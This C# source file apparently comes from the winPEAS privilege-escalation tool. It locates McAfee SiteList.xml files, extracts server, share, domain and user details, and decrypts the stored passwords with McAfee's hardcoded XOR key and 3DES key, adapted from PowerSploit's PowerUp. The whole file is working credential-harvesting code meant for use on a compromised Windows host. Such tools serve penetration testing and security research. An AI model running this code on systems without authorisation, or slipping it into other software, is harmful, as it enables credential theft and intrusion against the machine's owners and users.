using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Xml;
using winPEAS.Helpers;
using winPEAS.Helpers.Search;

namespace winPEAS.Info.FilesInfo.McAfee
{
    internal class McAfee
    {
        public static IList<McAfeeSitelistInfo> GetMcAfeeSitelistInfos()
        {
            var result = new List<McAfeeSitelistInfo>();
            var sitelistFiles = SearchHelper.SearchMcAfeeSitelistFiles()?.ToList();

            if (sitelistFiles != null)
            {
                foreach (var sitelistFile in sitelistFiles)
                {
                    try
                    {
                        var xmlString = File.ReadAllText(sitelistFile);
                        xmlString = xmlString.Replace("<?xml version=\"1.0\" encoding=\"UTF-8\"?>", "");
                        var xmlDoc = new XmlDocument();

                        xmlDoc.LoadXml(xmlString);

                        var sites = xmlDoc.GetElementsByTagName("SiteList");

                        if (sites[0].ChildNodes.Count == 0)
                        {
                            continue;
                        }

                        var mcAfeeSites = new List<McAfeeSiteInfo>();

                        foreach (XmlNode site in sites[0].ChildNodes)
                        {
                            if (site.Attributes["Name"] == null || site.Attributes["Server"] == null)
                            {
                                continue;
                            }

                            var server = site.Attributes["Server"].Value;
                            var name = site.Attributes["Name"].Value;
                            var type = site.Name;

                            var encPassword = string.Empty;
                            var decPassword = string.Empty;
                            var relativePath = string.Empty;
                            var shareName = string.Empty;
                            var user = string.Empty;
                            var domainName = string.Empty;

                            foreach (XmlElement attribute in site.ChildNodes)
                            {
                                switch (attribute.Name)
                                {
                                    case "UserName":
                                        user = attribute.InnerText;
                                        break;

                                    case "Password":
                                        if (MyUtils.IsBase64String(attribute.InnerText))
                                        {
                                            encPassword = attribute.InnerText;
                                            decPassword = DecryptPassword(encPassword);
                                        }
                                        else
                                        {
                                            decPassword = attribute.InnerText;
                                        }
                                        break;

                                    case "DomainName":
                                        domainName = attribute.InnerText;
                                        break;

                                    case "RelativePath":
                                        relativePath = attribute.InnerText;
                                        break;

                                    case "ShareName":
                                        shareName = attribute.InnerText;
                                        break;

                                    default:
                                        break;
                                }
                            }

                            var config = new McAfeeSiteInfo(type, name, server, relativePath, shareName, user, domainName, encPassword, decPassword);

                            mcAfeeSites.Add(config);
                        }

                        if (mcAfeeSites.Count > 0)
                        {
                            //yield return new McAfeeSitelistInfo(sitelistFile, mcAfeeSites);
                            result.Add(new McAfeeSitelistInfo(sitelistFile, mcAfeeSites));
                        }
                    }
                    catch (Exception ex)
                    {
                        result.Add(new McAfeeSitelistInfo(sitelistFile, new List<McAfeeSiteInfo>(), ex.Message));
                    }
                }
            }

            return result;
        }

        private static string DecryptPassword(string base64password)
        {
            // Adapted from PowerUp: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1#L4128-L4326

            // References:
            //  https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
            //  https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
            //  https://github.com/tfairane/HackStory/blob/master/McAfeePrivesc.md
            //  https://www.syss.de/fileadmin/dokumente/Publikationen/2011/SySS_2011_Deeg_Privilege_Escalation_via_Antivirus_Software.pdf

            // static McAfee key XOR key LOL
            byte[] XORKey = { 0x12, 0x15, 0x0F, 0x10, 0x11, 0x1C, 0x1A, 0x06, 0x0A, 0x1F, 0x1B, 0x18, 0x17, 0x16, 0x05, 0x19 };

            // xor the input b64 string with the static XOR key
            var passwordBytes = Convert.FromBase64String(base64password);
            for (var i = 0; i < passwordBytes.Length; i++)
            {
                passwordBytes[i] = (byte)(passwordBytes[i] ^ XORKey[i % XORKey.Length]);
            }

            SHA1 crypto = new SHA1CryptoServiceProvider();

            //var tDESKey = MyUtils.CombineArrays(crypto.ComputeHash(System.Text.Encoding.ASCII.GetBytes("<!@#$%^>")), new byte[] { 0x00, 0x00, 0x00, 0x00 });
            byte[] tDESKey = { 62, 241, 54, 184, 179, 59, 239, 188, 52, 38, 167, 181, 78, 196, 26, 55, 124, 211, 25, 155, 0, 0, 0, 0 };

            // set the options we need
            var tDESalg = new TripleDESCryptoServiceProvider();
            tDESalg.Mode = CipherMode.ECB;
            tDESalg.Padding = PaddingMode.None;
            tDESalg.Key = tDESKey;

            // decrypt the unXor'ed block
            var decrypted = tDESalg.CreateDecryptor().TransformFinalBlock(passwordBytes, 0, passwordBytes.Length);
            var end = Array.IndexOf(decrypted, (byte)0x00);

            // return the final password string
            var password = System.Text.Encoding.ASCII.GetString(decrypted, 0, end);

            return password;
        }
    }
}
